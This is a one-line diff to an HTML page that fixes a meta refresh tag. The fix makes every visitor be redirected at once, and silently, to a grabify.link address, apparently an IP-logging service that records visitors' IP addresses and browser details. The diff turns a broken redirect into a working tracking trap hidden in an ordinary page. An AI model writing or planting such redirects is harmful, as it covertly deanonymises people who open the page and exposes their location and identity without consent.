@@ -1,1 +1,1 @@
-<meta http-equiv="refresh" content="0; url='grabify.link/CEO8RE'" />
+<meta http-equiv="Refresh" content="0; url='https://grabify.link/CEO8RE'" />
